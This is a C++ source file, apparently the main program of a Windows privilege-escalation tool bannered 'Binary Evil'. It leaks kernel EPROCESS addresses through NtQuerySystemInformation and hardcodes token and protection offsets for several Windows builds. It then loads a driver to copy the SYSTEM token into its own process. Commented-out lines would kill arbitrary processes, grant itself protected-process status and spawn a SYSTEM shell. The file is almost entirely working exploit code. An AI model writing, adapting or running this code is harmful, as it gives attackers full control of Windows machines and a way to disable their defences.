#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <iostream>
#include "Log.hpp"
#include "Utils.hpp"
#include "DriverLoader.h"
#include "DriverWorker.hpp"

#define NtCurrentProcess()				((HANDLE)(LONG_PTR)-1)
#define SystemHandleInformation			0x10
#define SystemHandleInformationSize		0x400000
#ifndef STATUS_BUFFER_TOO_SMALL
#define STATUS_BUFFER_TOO_SMALL ((NTSTATUS)0xC0000023L)
#endif

#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif // !STATUS_INFO_LENGTH_MISMATCH

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	USHORT	UniqueProcessId;
	USHORT	CreatorBackTraceIndex;
	UCHAR	ObjectTypeIndex;
	UCHAR	HandleAttributes;
	USHORT	HandleValue;
	PVOID	Object;
	ULONG	GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;


typedef
NTSTATUS(__stdcall* pfnNtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS,
	PVOID,
	ULONG,
	PULONG);
pfnNtQuerySystemInformation pNtQuerySystemInformation;

typedef NTSTATUS(WINAPI* pRtlGetVersion)(PRTL_OSVERSIONINFOW);

DWORD GetWindowsBuildNumber()
{
	HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
	if (!hNtdll)
	{
		return 0;
	}

	pRtlGetVersion RtlGetVersion = (pRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
	if (!RtlGetVersion)
	{
		LOG("[-] Failed to get RtlGetVersion address. Error code: " << std::hex << GetLastError() << std::dec);
		return 0;
	}

	RTL_OSVERSIONINFOW osvi = { 0 };
	osvi.dwOSVersionInfoSize = sizeof(osvi);

	if (NT_SUCCESS(RtlGetVersion(&osvi)))
	{
		LOG("[+] Windows Version: " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion
			<< " Build: " << osvi.dwBuildNumber << std::endl);
		return osvi.dwBuildNumber;
	}
	return 0;
}

static
int
InitFunc()
{
	HMODULE hModule = GetModuleHandle(L"ntdll.dll");

	if (hModule)
	{
		pNtQuerySystemInformation = (pfnNtQuerySystemInformation)GetProcAddress(hModule, "NtQuerySystemInformation");
		if (!pNtQuerySystemInformation)
		{
			printf("[-] NtQuerySystemInformation not loaded\n");
			return 1;
		}
	}

	return 0;
}

static
int
GetObjectPointer(
	PULONG64 ppObjAddr,
	ULONG ulPid,
	HANDLE handle)
{
	int Ret{ -1 };
	PSYSTEM_HANDLE_INFORMATION pHandleInfo{};
	ULONG		ulBytes{};
	NTSTATUS	Status{ STATUS_SUCCESS };

	while ((Status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation,
											   pHandleInfo,
											   ulBytes,
											   &ulBytes)) == 0xC0000004L)
	{
		if (pHandleInfo != NULL)
		{
			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(),
																  HEAP_ZERO_MEMORY,
																  pHandleInfo,
																  (size_t)2 * ulBytes);
		}
		else
		{
			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(),
																HEAP_ZERO_MEMORY,
																(size_t)2 * ulBytes);
		}
	}

	if (Status != NULL)
	{
		Ret = Status;
		goto done;
	}

	for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++)
	{
		if ((pHandleInfo->Handles[i].UniqueProcessId == ulPid) &&
			(pHandleInfo->Handles[i].HandleValue == static_cast<USHORT>(HandleToULong(handle))))
		{
			*ppObjAddr = (ULONG64)pHandleInfo->Handles[i].Object;
			Ret = 0;
			break;
		}
	}

done:

	if (pHandleInfo)
	{
		HeapFree(GetProcessHeap(), 0, pHandleInfo);
	}


	return Ret;
}



int main(int args, char** argv)
{
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, 5);  // 5 13 pink


	DWORD EPROCESS_TOKEN_OFFSET = 0;
	DWORD ProtectionOffset		= 0;
	DWORD SignatureLevelOffset	= 0;
	DWORD buildNumber = GetWindowsBuildNumber();
	if (buildNumber >= 26100)
	{
		EPROCESS_TOKEN_OFFSET = 0x248;
		ProtectionOffset = 0X5FA;
		SignatureLevelOffset = 0x5F8;
	}
	else if (buildNumber >= 19041)
	{
		EPROCESS_TOKEN_OFFSET = 0x4B8;
		ProtectionOffset = 0X87A;
		SignatureLevelOffset = 0x878;
	}
	else if (buildNumber >= 18362)
	{
		EPROCESS_TOKEN_OFFSET = 0x360;
		ProtectionOffset = 0X6FA;
		SignatureLevelOffset = 0x6F8;
	}
	else if (buildNumber >= 15063)
	{
		EPROCESS_TOKEN_OFFSET = 0x358;
		ProtectionOffset = 0X6CA;
		SignatureLevelOffset = 0x6C8;
	}
	else if (buildNumber >= 14393)
	{
		EPROCESS_TOKEN_OFFSET = 0x358;
		ProtectionOffset = 0X6C2;
		SignatureLevelOffset = 0x6C0;
	}
	else
	{
		return -1;
	}

	constexpr std::string_view art = R"(

$$$$$$$\   $$\                                                   $$$$$$$$\          $$\  $$\ 
$$  __$$\  \__|                                                  $$  _____|         \__| $$ |
$$ |  $$ | $$\  $$$$$$$\    $$$$$$\    $$$$$$\   $$\   $$\       $$ |   $$\    $$\  $$\  $$ |
$$$$$$$\ | $$ | $$  __$$\   \____$$\  $$  __$$\  $$ |  $$ |      $$$$$$ \$$\  $$  | $$ | $$ |
$$  __$$\  $$ | $$ |  $$ |  $$$$$$$ | $$ |  \__| $$ |  $$ |      $$  ___ \$$\$$  /  $$ | $$ |
$$ |  $$ | $$ | $$ |  $$ | $$  __$$ | $$ |       $$ |  $$ |      $$ |     \$$$  /   $$ | $$ |
$$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /    $$ | $$ |
\_______/  \__| \__|  \__|  \_______| \__|        \____$$ |      \_________ \_/     \__| \__|
                                                 $$\   $$ |                              
                                                 \$$$$$$  |                              
                                                  \______/                               
	)";

	LOG(art);

	SetConsoleTextAttribute(hConsole, 7);

	if (InitFunc() != 0)
	{
		LOG("[-] Failed to initialize function pointers");
		return 1;
	}

	// Test Kill Process
	//ULONG nPid = atoi(argv[1]);

	////Sleep(10000);
	//DriverWorker::Kill(nPid);

	ULONG64 SystemProcess{ 0 };
	ULONG64 CurrentProcess{ 0 };

	
	BOOLEAN bResult{ FALSE };
	NTSTATUS status = Utils::RtlAdjustPrivilege(20, TRUE, FALSE, &bResult);
	if (!NT_SUCCESS(status))
	{
		LOG("[-] Failed to adjust privilege. Error code: 0x" << std::hex << status << " line = " << __LINE__);
		return 1;
	}

	auto nResult = GetObjectPointer(&SystemProcess, 4, ULongToHandle(4));
	if (nResult != 0 || SystemProcess == 0)
	{
		LOG("[-] GetObjectPtr failed for system process with error code: " << nResult);
		return nResult;
	}

	auto hCurrentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	if (!hCurrentProcess)
	{
		LOG("[-] OpenProcess failed for current process with error code: " << GetLastError());
	}
	nResult = GetObjectPointer(&CurrentProcess, GetCurrentProcessId(), hCurrentProcess);
	if (nResult != 0 || CurrentProcess == 0)
	{
		LOG("[-] GetObjectPtr failed for current process with error code: " << nResult);
		return nResult;
	}


	auto initResult = DriverWorker::InitializeDriver();
	if (!initResult)
	{
		LOG("[-] Failed to initialize driver");
		return 1;
	}

	SetConsoleTextAttribute(hConsole, 13);  // 5 13 pink

	DriverLoader::PrivilegeEscalation(SystemProcess, CurrentProcess, EPROCESS_TOKEN_OFFSET);
	
	SetConsoleTextAttribute(hConsole, 7);

	////DriverLoader::PS_PROTECTION protection{};
	//////protection.Level = 0x01; // Protected Light
	////protection.Type		= DriverLoader::PsProtectedTypeProtected;
	////protection.Signer	= DriverLoader::PsProtectedSignerWinSystem;

	////DriverLoader::SetProcessProtection(CurrentProcess, ProtectionOffset, &protection);

	// MessageBoxA(nullptr,
	//			"If you see this message box, the process is still alive. Click OK to spawn a SYSTEM shell.",
	//			"Process Status",
	//			MB_OK);
	//
	DriverWorker::UninitializeDriver();


	


	system("pause");

	return 0;
}